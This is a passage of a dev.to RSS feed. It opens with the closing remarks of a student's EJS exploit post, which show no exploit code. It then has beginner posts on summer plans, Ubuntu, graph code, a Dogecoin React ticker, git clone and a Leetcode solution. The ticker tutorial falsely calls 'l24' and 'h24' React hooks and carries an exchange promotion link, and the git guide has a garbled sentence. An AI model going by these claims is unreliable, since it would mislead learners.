&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--oDtAqcrB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/risk-rating.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--oDtAqcrB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/boiledsteak/EJS-Exploit/main/screenshots/risk-rating.png" alt="risk rating"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#thats-it"&gt;
  &lt;/a&gt;
  That's it!
&lt;/h1&gt;

&lt;p&gt;Thank you for reading my first post :) Yes I know it's a very simple and amateur exploit but I hope someone finds it useful. I'm just a student with no real professional experience so some of my information may even be false or misinformed. Please let me know if I missed anything. You can read more about javascript prototype pollution to understand deeper why this vulnerability even exists. &lt;/p&gt;

</description>
      <category>node</category>
      <category>security</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Summer Plans of a Freshman CS student</title>
      <author>Firangiz Ganbarli</author>
      <pubDate>Sat, 05 Jun 2021 11:13:49 +0000</pubDate>
      <link>https://dev.to/firangizg/summer-plans-of-a-freshman-cs-student-1p68</link>
      <guid>https://dev.to/firangizg/summer-plans-of-a-freshman-cs-student-1p68</guid>
      <description>&lt;p&gt;Hey everyone! &lt;/p&gt;

&lt;p&gt;As summer months have started, and I have had a sufficient break after university, I was planning on how to spend my summer efficiently since I will be applying for internships in Summer 2022.&lt;/p&gt;

&lt;p&gt;My freshman year as a Computer Engineering student has ended and by the end of the summer, I will start my applications, so most of the tasks I will try to accomplish by the end of summer will be geared towards that. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#1-learn-python"&gt;
  &lt;/a&gt;
  1. Learn Python
&lt;/h3&gt;

&lt;p&gt;I have been learning Python inefficiently for a long time and think that this free time during the summer could be used efficiently to learn the fundamentals of Python properly. To do this, I am still searching for good resources but as of now I am planning to follow the interactive textbook of &lt;a href="https://runestone.academy/runestone/books/published/thinkcspy/index.html"&gt;How to Think Like a Computer Scientist&lt;/a&gt;. Comment down below if you have any other good resources to learn Python well!&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-build-side-projects"&gt;
  &lt;/a&gt;
  2. Build Side Projects
&lt;/h3&gt;

&lt;p&gt;While I have doing small "tutorial" projects like Madlibs or Rock,Paper,Scissors as an exercise, I actually want to do two proper side projects and finish it by the end of the summer. I do not need them to be technically complex, but rather, quality side projects that people would actually use. If you have any ideas of nice side projects that let me learn well, I am open to suggestions!&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3-finish-cracking-the-coding-interview-book"&gt;
  &lt;/a&gt;
  3. Finish Cracking the Coding Interview Book
&lt;/h3&gt;

&lt;p&gt;Since I have not taken a Data Structures and Algorithms class in university yet, I am a bit behind on the content of programming interviews so I need to read up on the fundamental data structures and algorithms. I have already started reading &lt;a href="https://www.amazon.com/Cracking-Coding-Interview-Programming-Questions/dp/0984782850/ref=sr_1_1?dchild=1&amp;amp;gclid=Cj0KCQjwweyFBhDvARIsAA67M71hTdYS-xEQp2C9nSDMrOjcHXawDm9KaBzig0yXWXPR7yBuc_PPQQEaAq9VEALw_wcB&amp;amp;hvadid=241870593966&amp;amp;hvdev=c&amp;amp;hvlocint=1017537&amp;amp;hvlocphy=1000998&amp;amp;hvnetw=g&amp;amp;hvqmt=e&amp;amp;hvrand=784618840862712783&amp;amp;hvtargid=kwd-20040243067&amp;amp;hydadcr=16409_10304044&amp;amp;keywords=cracking+the+coding+interview&amp;amp;qid=1622891243&amp;amp;sr=8-1"&gt;Cracking the Coding Interview Book&lt;/a&gt; and it is very useful. Hopefully, by the end of the summer I have mastered enough of the topics on the book. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#4-grind-some-leetcode-questions"&gt;
  &lt;/a&gt;
  4. Grind some Leetcode questions
&lt;/h3&gt;

&lt;p&gt;This goes along with plan number 3. While the book is great for learning and also doing the exercises help, I need more practice with questions that will be similar to the interviews I will potentially do. I have compared several practice websites, and I also do not want to keep searching and comparing which website is the best to use, so I will do the questions in Leetcode even though I am struggling with easy questions right now. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#5-attend-hackathons"&gt;
  &lt;/a&gt;
  5. Attend hackathons
&lt;/h3&gt;

&lt;p&gt;I love hackathons, the entrepreneurial and innovative spirit of hackathons excite me. And I am most innovative when working with other people, so I will attend virtual hackathons over the summer and hopefully make nice projects (maybe even win some, but that is definitely not the point). &lt;/p&gt;

&lt;p&gt;Well, these are my plans for this summer. Hopefully that was a fun and insightful read. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;What are your plans for this summer? If you are working/have an internship, how is it going?&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

</description>
      <category>programming</category>
      <category>career</category>
      <category>productivity</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Review of Ubuntu after 4 months of daily usage </title>
      <author>krishna kakade</author>
      <pubDate>Sat, 05 Jun 2021 11:11:14 +0000</pubDate>
      <link>https://dev.to/krishnakakade/review-of-ubuntu-after-4-months-of-daily-usage-3815</link>
      <guid>https://dev.to/krishnakakade/review-of-ubuntu-after-4-months-of-daily-usage-3815</guid>
      <description>&lt;p&gt;hello all In this article &lt;br&gt;
I will explain of experience of ubuntu after 4 months of daily heavy usage.&lt;br&gt;
Firstly this my first-time regular usage of ubuntu firstly I am a windows guy but I have tried ubuntu a couple of times but not heavy regular usage so in this article I will pros and cons of ubuntu and also the problems I face and how I solved those things.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Overall UI(User Experience) review&lt;/strong&gt; &lt;br&gt;
Transitioning to ubuntu after using windows more than 3 years of regular usage firstly I am excited for the change new ecosystem I didn't find any flaws or complications in UI of Ubuntu 20.04 infact Ubuntu feels like Mac OS to me that is kind of cool thing now question arises what if there is UI freeze kind of thing &lt;br&gt;
&lt;strong&gt;how I am tackling with UI issues&lt;/strong&gt;&lt;br&gt;
In case of windows my laptop is used to show 100% disk usage and because of that my laptop used to freeze daily so then I have to do restart again and again and I having pretty much good hardware 16gigs of RAM 2 TB hdd but I don't have ssd:( Now in case of Ubuntu as a primary operating system it's been four months now hardly my UI doc and overall UI freezed less than 5 times and if that happens like user interface not responding then simple fix for that is &lt;strong&gt;ALT +F2&lt;/strong&gt; and just type &lt;strong&gt;r&lt;/strong&gt; in that box and it's done issue solved 💪😄👌 sounds cool right but it feels better than sounds cool 😊 so no major issues with UI everything works fine. &lt;br&gt;
&lt;strong&gt;So-called command syndrome&lt;/strong&gt;&lt;br&gt;
Most developers/users think ubuntu is hard to use no that is the myth of the group of folks because as we need to install apps/programs in ubuntu manually but there thousand of resources available on the internet like if need to install vscode or lmms there is installation command guide available for that. so installing and removing the program is not big task.&lt;br&gt;
and all development thing works fine and no worries with that every App that developer need that is available in linux.&lt;br&gt;
Problems for that i didn't got good solution for &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;react native installation doesn't work&lt;/li&gt;
&lt;li&gt;some times music breaks not always once in while.
*&lt;em&gt;Only thing i miss in this OS is playing games i tried epic games through lutris but didn't worked that is only sad other thing smooth like butter *&lt;/em&gt;
That's it for this one .
thank you for reading :)
Should you switch to linux 
&lt;img src="https://i.giphy.com/media/JoPrI0tpxDhX7f7iPl/giphy.gif" alt="gify"&gt;
&lt;/li&gt;
&lt;/ul&gt;

</description>
    </item>
    <item>
      <title>Trying to understand Adjacency Matrix Representation of an Graph</title>
      <author>ganeshkulkarni123</author>
      <pubDate>Sat, 05 Jun 2021 10:33:26 +0000</pubDate>
      <link>https://dev.to/ganeshkulkarni123/trying-to-understand-adjacency-matrix-representation-of-an-graph-18fn</link>
      <guid>https://dev.to/ganeshkulkarni123/trying-to-understand-adjacency-matrix-representation-of-an-graph-18fn</guid>
      <description>&lt;p&gt;Hi trying to understand toString method from the following code, It's clear to me that to represent graph in string format we 're iterating through vertex and array, but what's logic behind it? How it's exactly working? Any help would be appreciated&lt;br&gt;
: public class AdjMatrixGraph {&lt;/p&gt;

&lt;p&gt;private int V; // number of vertices in Graph&lt;br&gt;
    private int E; // number of edges in Graph&lt;br&gt;
    private int[][] adjMatrix;&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;public AdjMatrixGraph(int nodes) {
    this.V = nodes;
    this.E = 0;
    this.adjMatrix = new int[nodes][nodes];
}

public void addEdge(int u, int v) {
    adjMatrix[u][v] = 1;
    adjMatrix[v][u] = 1; // because it is an undirected graph
    E++;
}

public String toString() {
    StringBuilder sb = new StringBuilder();
    sb.append(V + " vertices, " + E + " edges " + "\n");
    for(int v = 0; v &amp;lt; V; v++) {
        sb.append(v + ": ");
        for(int w : adjMatrix[v]) {
            sb.append(w + " ");
        }
        sb.append("\n");
    }
    return sb.toString();
}

public static void main(String[] args) {
    AdjMatrixGraph g = new AdjMatrixGraph(4);
    g.addEdge(0, 1);
    g.addEdge(1, 2);
    g.addEdge(2, 3);
    g.addEdge(3, 0);
    System.out.println(g);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;p&gt;}&lt;/p&gt;

</description>
      <category>algorithms</category>
    </item>
    <item>
      <title>Create Your Dogecoin Market Ticker in React</title>
      <author>Devendra Sri</author>
      <pubDate>Sat, 05 Jun 2021 10:15:01 +0000</pubDate>
      <link>https://dev.to/devendrasri1/create-your-dogecoin-market-ticker-in-react-3j3</link>
      <guid>https://dev.to/devendrasri1/create-your-dogecoin-market-ticker-in-react-3j3</guid>
      <description>&lt;p&gt;Initiatives &amp;amp; Projects. They are adored by all. Especially those that help us solidify the fundamentals and learn something new. Dogecoin has been trending over the last week, so why not create something related to it?&lt;/p&gt;

&lt;p&gt;In this project, we will create a simple Dogecoin price ticker, which will be a web app that will fetch the lowest price of the day, the highest price of the day, and the most recently traded price via an API and will be updated every 10 seconds. You will learn how to set up a React project, build components, props, state, and the most commonly used React hooks such as &lt;strong&gt;&lt;em&gt;l24&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;h24&lt;/em&gt;&lt;/strong&gt;.&lt;br&gt;
Ticker API:&lt;br&gt;
&lt;a href="https://api.buyucoin.com/ticker/v1.0/liveData?symbol=USDT-BTC"&gt;https://api.buyucoin.com/ticker/v1.0/liveData?symbol=USDT-BTC&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Developing a React Project&lt;/strong&gt;&lt;br&gt;
The first step is to create a React project for ourselves. We'll use Create React App for this, which will allow us to focus on our code rather than worrying about setting up the build tools. You'll need NodeJS v8.10 or higher, as well as NPM version 5.6 or higher.&lt;/p&gt;

&lt;p&gt;Open your terminal and type the following command in the directory of your choice:&lt;br&gt;
npx is a package runner included with npm. The preceding command may take 5-10 minutes to complete, so grab a cup of coffee and unwind!&lt;/p&gt;

&lt;p&gt;Let's move on to the project directory now. You could use the file explorer or the following terminal command to accomplish this: &lt;a href="https://www.buyucoin.com/buy-dogecoin-india"&gt;dogecoin&lt;/a&gt; ticker cd Now, open the project folder in your preferred text editor, and we'll begin with the initial setup in the following section. Run npm start in the project folder on your terminal to start the development server.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Initial Configuration&lt;/strong&gt;&lt;br&gt;
After we start our development server with npm start, navigate to localhost:3000 in your browser and you'll see something like this.&lt;/p&gt;

&lt;p&gt;This is the default homepage generated by Create React App. Since we don't require anything similar, let's begin by deleting unnecessary files and configuring the project to meet our needs.&lt;/p&gt;

&lt;p&gt;Our index.html file, which will be rendered by our browser, is located in the public folder. Open it up and begin by removing any unwanted comments and changing the webpage's title. You can also change the description meta tag and add your own. When you're finished, your index.html.&lt;/p&gt;

&lt;p&gt;You can also changed the favicon and logo images, which you can download here, to add a more personal touch to our website.&lt;/p&gt;

&lt;p&gt;Let's go to the src folder now. Most of the files here, such as App.test.js, logo.svg, reportWebVitals.js, and setupTests.js, can be removed. You may have noticed that when you save, our development server throws an error indicating that it failed to compile. We need to fix the imports as well because we deleted the above files. Check out this commit to see the details of the additions and deletions. &lt;/p&gt;

&lt;p&gt;We replaced all of the existing content generated by Create React App with a div containing a h1 with the text 'Dogecoin Ticker.' I've also changed the function to an arrow function, but this isn't required. This function returns some JSX that React renders. It is referred to as a component because it can be used in multiple places throughout our project.&lt;/p&gt;

</description>
      <category>react</category>
      <category>ticker</category>
      <category>data</category>
      <category>javascript</category>
    </item>
    <item>
      <title>How to Clone/Download A GitHub Repository</title>
      <author>Sanjay Singh Rajpoot</author>
      <pubDate>Sat, 05 Jun 2021 10:02:45 +0000</pubDate>
      <link>https://dev.to/sanjaysinghrajpoot/how-to-clone-download-a-github-repository-3npp</link>
      <guid>https://dev.to/sanjaysinghrajpoot/how-to-clone-download-a-github-repository-3npp</guid>
      <description>&lt;p&gt;GitHub has one of the largest collection of repositories in the world. From small websites to big complex software, everything is here. To get the code on your local there is no direct method you have to clone the repository to your local machine. There are 2 ways how you could do this first one is using Command-line and the other one is using the command-line. For beginners, I would suggest you use GitHub Desktop as this method is simple to use and you won’t get stuck in it.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#using-commandline"&gt;
  &lt;/a&gt;
  Using Command-line
&lt;/h2&gt;

&lt;p&gt;To clone a repository using Command-Line you have to first install git version control then only you will be able to clone the repo.&lt;/p&gt;

&lt;p&gt;1.On Github, navigate to the repository page which you want to clone/download.&lt;br&gt;
2.Above the list of files, you will see a green button click  Code.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--LNX4i5bW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5s65vmd0666vf3wstp02.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--LNX4i5bW--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5s65vmd0666vf3wstp02.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3.To clone the repository using HTTPS, under “Clone with HTTPS”, click. To clone/download the repository using an SSH key, including a certificate issued by your organization’s SSH certificate authority, click Use SSH, then click. To clone a repository using GitHub CLI, click Use GitHub CLI, then click.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--EGhOEd7U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rrtndmreop4gqo4mjdzn.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--EGhOEd7U--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rrtndmreop4gqo4mjdzn.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4.The clipboard icon for copying the URL to clone a repository&lt;/p&gt;

&lt;p&gt;5.Open Terminal&lt;br&gt;
6.Change the current working directory to the location where you want the cloned directory.&lt;br&gt;
7.Type git clone, and then paste the URL you copied earlier.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ git clone https://github.com/YOUR-USERNAME/YOUR-REPOSITORY
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;8.Press Enter to create your local clone.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;$ git clone https://github.com/YOUR-USERNAME/YOUR-REPOSITORY
&amp;gt; Cloning into `Spoon-Knife`...
&amp;gt; remote: Counting objects: 10, done.
&amp;gt; remote: Compressing objects: 100% (8/8), done.
&amp;gt; remove: Total 10 (delta 1), reused 10 (delta 1)
&amp;gt; Unpacking objects: 100% (10/10), done.
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#method-2-using-github-desktop"&gt;
  &lt;/a&gt;
  Method 2 – Using GitHub Desktop
&lt;/h2&gt;

&lt;p&gt;1.Go to GitHub.com, navigate to the main page of the repository.&lt;/p&gt;

&lt;p&gt;2.Above all the code you will find a Code button in green colour click it to open a small tab.&lt;br&gt;
"Code" button&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--hmIj_nMC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vz1rdpfoego2my6q9qt5.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--hmIj_nMC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vz1rdpfoego2my6q9qt5.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3.Click on GitHub desktop to clone and open the repository with GitHub Desktop.&lt;br&gt;
"Open with GitHub Desktop" button&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--kOBrkqTs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/aad0zx2drumlqm7yc0wc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kOBrkqTs--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/aad0zx2drumlqm7yc0wc.png" alt="image"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4.Follow the prompts in GitHub Desktop to complete the clone.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;With this, you will have a folder created on your local machine with git initiated in it. Now any changes that you make in that folder can be committed easily to GitHub again.&lt;/p&gt;

&lt;p&gt;In this document we took a deep look at git clone. The most important takeaways are:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;git clone is used to create a copy of a target repo&lt;/li&gt;
&lt;li&gt;The target repo can be local or remote&lt;/li&gt;
&lt;li&gt;Git supports a few network protocols to connect to remote repos&lt;/li&gt;
&lt;li&gt;There are many different configuration options available that change the content of the clone&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If you face any problem with the above steps, just comment below. Read my blogs at sanjaysinghrajpoot.me &lt;/p&gt;

</description>
      <category>github</category>
      <category>githunt</category>
      <category>git</category>
    </item>
    <item>
      <title>Solution: Maximum Performance of a Team</title>
      <author>seanpgallivan</author>
      <pubDate>Sat, 05 Jun 2021 10:01:26 +0000</pubDate>
      <link>https://dev.to/seanpgallivan/solution-maximum-performance-of-a-team-244n</link>
      <guid>https://dev.to/seanpgallivan/solution-maximum-performance-of-a-team-244n</guid>
      <description>&lt;p&gt;&lt;em&gt;This is part of a series of Leetcode solution explanations (&lt;a href="https://dev.to/seanpgallivan/leetcode-solutions-index-57fl"&gt;index&lt;/a&gt;). If you liked this solution or found it useful,&lt;/em&gt; &lt;strong&gt;&lt;em&gt;please like&lt;/em&gt;&lt;/strong&gt; &lt;em&gt;this post and/or&lt;/em&gt; &lt;strong&gt;&lt;em&gt;upvote&lt;/em&gt;&lt;/strong&gt; &lt;em&gt;&lt;a href="https://leetcode.com/problems/maximum-performance-of-a-team/discuss/1252316"&gt;my solution post on Leetcode's forums&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;




&lt;h4&gt;
  &lt;a href="#leetcode-problem-1383-hard-maximum-performance-of-a-team"&gt;
  &lt;/a&gt;
  &lt;a href="https://leetcode.com/problems/maximum-performance-of-a-team/"&gt;Leetcode Problem #1383 (&lt;em&gt;Hard&lt;/em&gt;): Maximum Performance of a Team&lt;/a&gt;
&lt;/h4&gt;




&lt;h4&gt;
  &lt;a href="#description"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Description:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#idea"&gt;&lt;em&gt;Solution Idea&lt;/em&gt;&lt;/a&gt; || &lt;em&gt;Code&lt;/em&gt;: &lt;a href="#javascript-code"&gt;&lt;em&gt;JavaScript&lt;/em&gt;&lt;/a&gt; | &lt;a href="#python-code"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; | &lt;a href="#java-code"&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt; | &lt;a href="#c-code"&gt;&lt;em&gt;C++&lt;/em&gt;&lt;/a&gt;)&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;You are given two integers &lt;code&gt;n&lt;/code&gt; and &lt;code&gt;k&lt;/code&gt; and two integer arrays &lt;code&gt;speed&lt;/code&gt; and &lt;code&gt;efficiency&lt;/code&gt; both of length &lt;code&gt;n&lt;/code&gt;. There are &lt;code&gt;n&lt;/code&gt; engineers numbered from &lt;code&gt;1&lt;/code&gt; to &lt;code&gt;n&lt;/code&gt;. &lt;code&gt;speed[i]&lt;/code&gt; and &lt;code&gt;efficiency[i]&lt;/code&gt; represent the speed and efficiency of the &lt;code&gt;i&lt;/code&gt;th engineer respectively.&lt;/p&gt;

&lt;p&gt;Choose &lt;strong&gt;at most&lt;/strong&gt; &lt;code&gt;k&lt;/code&gt; different engineers out of the &lt;code&gt;n&lt;/code&gt; engineers to form a team with the maximum &lt;strong&gt;performance&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The performance of a team is the sum of their engineers' speeds multiplied by the minimum efficiency among their engineers.&lt;/p&gt;

&lt;p&gt;Return the maximum performance of this team. Since the answer can be a huge number, return it &lt;strong&gt;modulo&lt;/strong&gt; &lt;code&gt;10^9 + 7&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;




&lt;h4&gt;
  &lt;a href="#examples"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Examples:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;blockquote&gt;
&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Example 1:&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Input:&lt;/td&gt;
&lt;td&gt;n = 6, speed = [2,10,3,1,5,8], efficiency = [5,4,3,9,7,2], k = 2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Output:&lt;/td&gt;
&lt;td&gt;60&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Explanation:&lt;/td&gt;
&lt;td&gt;We have the maximum performance of the team by selecting engineer 2 (with speed=10 and efficiency=4) and engineer 5 (with speed=5 and efficiency=7). That is, performance = (10 + 5) * min(4, 7) = 60.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Example 2:&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Input:&lt;/td&gt;
&lt;td&gt;n = 6, speed = [2,10,3,1,5,8], efficiency = [5,4,3,9,7,2], k = 3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Output:&lt;/td&gt;
&lt;td&gt;68&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Explanation:&lt;/td&gt;
&lt;td&gt;This is the same example as the first but k = 3. We can select engineer 1, engineer 2 and engineer 5 to get the maximum performance of the team. That is, performance = (2 + 10 + 5) * min(5, 4, 7) = 68.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;

&lt;div class="table-wrapper-paragraph"&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Example 3:&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Input:&lt;/td&gt;
&lt;td&gt;n = 6, speed = [2,10,3,1,5,8], efficiency = [5,4,3,9,7,2], k = 4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Output:&lt;/td&gt;
&lt;td&gt;72&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;
&lt;/blockquote&gt;




&lt;h4&gt;
  &lt;a href="#constraints"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Constraints:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;1 &amp;lt;= &amp;lt;= k &amp;lt;= n &amp;lt;= 10^5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;speed.length == n&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;efficiency.length == n&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1 &amp;lt;= speed[i] &amp;lt;= 10^5&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1 &amp;lt;= efficiency[i] &amp;lt;= 10^8&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;




&lt;h4&gt;
  &lt;a href="#idea"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Idea:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

&lt;p&gt;&lt;br&gt;(&lt;em&gt;Jump to&lt;/em&gt;: &lt;a href="#description"&gt;&lt;em&gt;Problem Description&lt;/em&gt;&lt;/a&gt; || &lt;em&gt;Code&lt;/em&gt;: &lt;a href="#javascript-code"&gt;&lt;em&gt;JavaScript&lt;/em&gt;&lt;/a&gt; | &lt;a href="#python-code"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; | &lt;a href="#java-code"&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt; | &lt;a href="#c-code"&gt;&lt;em&gt;C++&lt;/em&gt;&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;The trick to this problem, like many best product of &lt;strong&gt;x&lt;/strong&gt; and &lt;strong&gt;y&lt;/strong&gt; problems, is to find a way to iterate through one of the values in order, then evaluate the other value for each combination and take the &lt;strong&gt;best&lt;/strong&gt; result. If we sort the engineers by &lt;strong&gt;efficiency&lt;/strong&gt;, we can iterate downward through the engineers while evaluating the combined speed (&lt;strong&gt;totalSpeed&lt;/strong&gt;) of the ideal group.&lt;/p&gt;

&lt;p&gt;Since the index numbers between &lt;strong&gt;speed&lt;/strong&gt; and &lt;strong&gt;efficiency&lt;/strong&gt; correspond to each other, we shouldn't just sort &lt;strong&gt;efficiency&lt;/strong&gt;, however. Instead, we can create another array of arrays (&lt;strong&gt;ord&lt;/strong&gt;) with both stats combined into one array, then sort it based on the efficiency.&lt;/p&gt;

&lt;p&gt;As we iterate through the engineers in &lt;strong&gt;ord&lt;/strong&gt; order and add them to the available pool, we know that all the engineers so far are at or higher than &lt;strong&gt;minEff&lt;/strong&gt;, so we're free to only choose the &lt;strong&gt;k&lt;/strong&gt; fastest engineers for our group. To keep track of the sorted order of speeds of the engineers in our available pool, we can use a &lt;strong&gt;min priority queue&lt;/strong&gt; (&lt;strong&gt;sppq&lt;/strong&gt;) or &lt;strong&gt;min heap&lt;/strong&gt; (&lt;strong&gt;spheap&lt;/strong&gt;) structure. This way, we can eliminate the slowest engineer from our pool every time we add an engineer over the &lt;strong&gt;k&lt;/strong&gt; limit. At each stop, we should also find the product of &lt;strong&gt;totalSpeed&lt;/strong&gt; and the current minimum efficiency and update the &lt;strong&gt;best&lt;/strong&gt; result if necessary.&lt;/p&gt;

&lt;p&gt;It's important to note that the instructions say "at most" &lt;strong&gt;k&lt;/strong&gt; engineers, so we should start keeping track of &lt;strong&gt;best&lt;/strong&gt; right away. Also, we should remember to &lt;strong&gt;modulo 1e9+7&lt;/strong&gt; before we &lt;strong&gt;return best&lt;/strong&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Time Complexity: O(N * log(N))&lt;/strong&gt; where &lt;strong&gt;N&lt;/strong&gt; is the length of &lt;strong&gt;speed&lt;/strong&gt; or &lt;strong&gt;efficiency&lt;/strong&gt;, for the sorting of &lt;strong&gt;ord&lt;/strong&gt; and for the priority queue / heap&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;&lt;strong&gt;Space Complexity: O(N)&lt;/strong&gt; for &lt;strong&gt;ord&lt;/strong&gt; and &lt;strong&gt;sppq&lt;/strong&gt; / &lt;strong&gt;spheap&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;




&lt;h4&gt;
  &lt;a href="#implementation"&gt;
  &lt;/a&gt;
  &lt;strong&gt;&lt;em&gt;Implementation:&lt;/em&gt;&lt;/strong&gt;
&lt;/h4&gt;

